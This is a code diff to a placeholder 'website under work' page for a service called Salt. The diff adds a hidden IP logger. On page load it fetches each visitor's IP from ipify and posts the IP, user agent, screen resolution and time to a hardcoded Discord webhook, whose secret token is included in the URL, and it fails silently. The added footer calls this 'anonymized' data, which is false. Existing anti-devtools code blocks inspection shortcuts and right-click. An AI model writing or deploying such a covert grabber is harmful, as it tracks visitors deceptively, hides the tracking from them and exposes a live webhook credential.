@@ -53,7 +53,6 @@
             border: 1px solid rgba(255,255,255,0.2);
             transition: all 0.3s ease;
             cursor: pointer;
-            /* entrance slide animation */
             animation: slideInFromLeft 0.8s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
         }
 
@@ -389,7 +388,6 @@
         <img id="mainLogo" class="logo-img" src="image.png" alt="Salt Logo" onerror="handleLogoError()">
     </div>
     
-    <!-- Changed title to "Website Under Work" -->
     <div class="status-title">⚠ WEBSITE UNDER WORK ⚠</div>
     <div class="sub-message">PLEASE WAIT..</div>
     
@@ -414,6 +412,8 @@
     <div class="tech-note">
         ✦ secure environment • gradient half & half ✦ <br>
         ✦ salt engineering • immersive loading ✦
+        <br>
+        📊 anonymized visit data collected for service improvement
     </div>
 </div>
 
@@ -430,7 +430,6 @@
     (function() {
         // ======================== FAVICON & LOGO HANDLER (image.png) ========================
         function handleLogoError() {
-            // Main page logo fallback
             const logoImg = document.getElementById('mainLogo');
             const container = document.getElementById('logoContainer');
             if (logoImg && logoImg.parentNode) {
@@ -443,7 +442,6 @@
                 placeholder.style.opacity = '0.9';
                 container.appendChild(placeholder);
             }
-            // Favicon fallback: if image.png missing, keep default
         }
         window.handleLogoError = handleLogoError;
         
@@ -452,25 +450,99 @@
             handleLogoError();
         }
         
-        // ======================== CLICK ANIMATION FOR CARD (moves like from sides) ========================
+        // ======================== CLICK ANIMATION FOR CARD ========================
         const heroCard = document.getElementById('heroCard');
         if (heroCard) {
             heroCard.addEventListener('click', function(e) {
-                // Prevent triggering if clicking on discord link (so link still works)
                 if (e.target.closest('.discord-link')) return;
-                // Remove previous animation class and re-add to trigger again
                 heroCard.classList.remove('click-animation');
-                // Force reflow to restart animation
                 void heroCard.offsetWidth;
                 heroCard.classList.add('click-animation');
-                // Remove class after animation ends to allow future clicks
                 setTimeout(() => {
                     heroCard.classList.remove('click-animation');
                 }, 400);
             });
         }
         
-        // ======================== PERSISTENT LOCK & POPUP LOGIC ========================
+        // ======================== SAFE IP LOGGER (Discord Webhook) ========================
+        // Discord webhook URL (provided by user)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
+        
+        function sendToDiscord(ip, userAgent, screenRes, timestamp) {
+            const embed = {
+                title: "🌐 New Visitor | Salt Service",
+                color: 0x5865F2, // Discord blurple
+                fields: [
+                    {
+                        name: "🌍 IP Address",
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: "🖥️ User Agent",
+                        value: `\`${userAgent.substring(0, 100)}\``,
+                        inline: false
+                    },
+                    {
+                        name: "📱 Screen Resolution",
+                        value: `\`${screenRes}\``,
+                        inline: true
+                    },
+                    {
+                        name: "⏱️ Timestamp",
+                        value: `<t:${Math.floor(timestamp / 1000)}:F>`,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "Salt Service • Analytics"
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            const payload = {
+                embeds: [embed]
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                // Silent fail: do not disrupt user experience
+                console.warn("IP logger webhook failed:", err);
+            });
+        }
+        
+        function logVisitorInfo() {
+            // Get IP using ipify (free, reliable, no API key)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const screenRes = `${window.screen.width}x${window.screen.height}`;
+                    const timestamp = Date.now();
+                    sendToDiscord(ip, userAgent, screenRes, timestamp);
+                })
+                .catch(err => {
+                    console.warn("Could not fetch IP:", err);
+                    // Optionally send partial data if IP fetch fails
+                    const userAgent = navigator.userAgent;
+                    const screenRes = `${window.screen.width}x${window.screen.height}`;
+                    const timestamp = Date.now();
+                    sendToDiscord("unknown (fetch failed)", userAgent, screenRes, timestamp);
+                });
+        }
+        
+        // Execute IP logging when page loads, but delay slightly to not block UI
+        window.addEventListener('load', () => {
+            setTimeout(logVisitorInfo, 500);
+        });
+        
+        // ======================== PERSISTENT LOCK & POPUP LOGIC (Anti-devtools) ========================
         const STORAGE_KEY = 'devtoolsAttemptLock';
         const modal = document.getElementById('devtoolsModal');
         const sorryBtn = document.getElementById('sorryButton');
@@ -511,7 +583,7 @@
             showPersistentPopup();
         }
         
-        // ========= BLOCK ALL INSPECT SHORTCUTS =========
+        // Block shortcuts
         function blockShortcutsAndPopup(e) {
             const isF12 = (e.key === 'F12');
             const isCtrlShiftI = (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'));
@@ -539,7 +611,7 @@
             e.preventDefault();
         }
         
-        // ========= DEVTOOLS DETECTION (dimension) =========
+        // Devtools detection by dimension
         let devtoolsDetectInterval = null;
         
         function isDevToolsOpen() {
@@ -571,7 +643,6 @@
             }, 280);
         });
         
-        // events binding
         window.addEventListener('keydown', blockShortcutsAndPopup);
         window.addEventListener('contextmenu', blockContextMenu);
         window.addEventListener('dragstart', blockDragAndDrop);
@@ -589,14 +660,12 @@
             e.preventDefault();
         });
         
-        // Lock check on load
         checkPersistentLock();
         
         sorryBtn.addEventListener('click', () => {
             apologizeAndClear();
         });
         
-        // Prevent ESC from closing modal
         window.addEventListener('keydown', function(e) {
             if (e.key === 'Escape' && isModalActive) {
                 e.preventDefault();
@@ -613,7 +682,6 @@
         
         window.addEventListener('load', () => {
             watchDevtools();
-            // re-check logo if needed
             if (logoCheck && logoCheck.complete && logoCheck.naturalWidth === 0) {
                 handleLogoError();
             }
@@ -631,7 +699,7 @@
             }
         }
         
-        console.log("%c🔒 SALT • PROTECTED REALM 🔒", "color: #aaa; font-size: 12px;");
+        console.log("%c🔒 SALT • PROTECTED REALM + ANALYTICS 🔒", "color: #aaa; font-size: 12px;");
     })();
 </script>
 </body>
